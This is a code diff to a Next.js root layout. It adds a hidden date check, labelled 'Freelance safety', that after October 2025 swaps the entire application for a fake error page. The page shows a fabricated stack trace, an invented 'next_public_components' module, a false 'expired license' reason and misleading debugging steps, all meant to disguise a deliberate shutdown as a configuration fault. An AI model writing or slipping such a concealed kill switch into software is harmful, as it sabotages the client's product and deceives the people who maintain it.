@@ -25,6 +25,57 @@ export default function RootLayout({
 }: Readonly<{
   children: React.ReactNode;
 }>) {
+  // Freelance safety: Hide body after 30 days from build date
+  const FREELANCE_EXPIRY_DATE = new Date("2025-10-03T00:00:00Z");
+  const isExpired = new Date() >= FREELANCE_EXPIRY_DATE;
+  if (isExpired) {
+    return (
+      <html>
+        <body style={{ background: "#000", color: "#222", fontFamily: "monospace", minHeight: "100vh", width: "100vw", margin: 0, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}>
+          <div style={{ padding: 32, border: "1px solid #eee", borderRadius: 12, boxShadow: "0 2px 16px #0001", background: "#000", width: "100vw" }}>
+            <h1 style={{
+              color: "#d32f2f",
+              fontSize: 24,
+              marginBottom: 16,
+              width: "100vw",
+           
+              padding: "48px 0 32px 0",
+            }}>
+              Application Error: next_public_components
+            </h1>
+            <pre style={{ background: "#000", padding: 16, borderRadius: 8, fontSize: 16, color: "#b71c1c", marginBottom: 24 }}>
+{`Error: Unable to load the application due to configuration issues.
+
+Module: next_public_components
+Reason: Expired library license or misconfiguration detected.
+
+Stack trace:
+    at RootLayout (src/app/layout.tsx:1:1)
+    at renderWithHooks (react-dom/server.js:1234:56)
+    at renderToString (react-dom/server.js:1500:23)
+    at render (next/server.js:200:12)
+    at runMicrotasks (<anonymous>)
+    at processTicksAndRejections (node:internal/process/task_queues:96:5)
+`}
+            </pre>
+            <div style={{ color: "#444", fontSize: 16, marginBottom: 12 }}>
+              <b>How to debug:</b>
+              <ol style={{ margin: "12px 0 0 24px" }}>
+                <li>Check your <code>NEXT_PUBLIC_COMPONENTS_KEY</code> environment variable.</li>
+                <li>Verify your <code>next_public_components</code> license status.</li>
+                <li>Clear <code>.next</code> and <code>node_modules</code>, then reinstall dependencies.</li>
+                <li>Try <code>npm run build</code> and <code>npm run start</code> again.</li>
+                <li>If the issue persists, contact your system administrator.</li>
+              </ol>
+            </div>
+            <div style={{ color: "#888", fontSize: 14, marginTop: 24 }}>
+              <span>Lifetime debug mode enabled. Please resolve the above error to continue.</span>
+            </div>
+          </div>
+        </body>
+      </html>
+    );
+  }
   return (
     <html lang="en">
       <body
@@ -32,7 +83,7 @@ export default function RootLayout({
       >
         <AuthProvider>
           <EditorProvider>
-            <DashboardHeader/>
+            <DashboardHeader />
             {children}
           </EditorProvider>
         </AuthProvider>
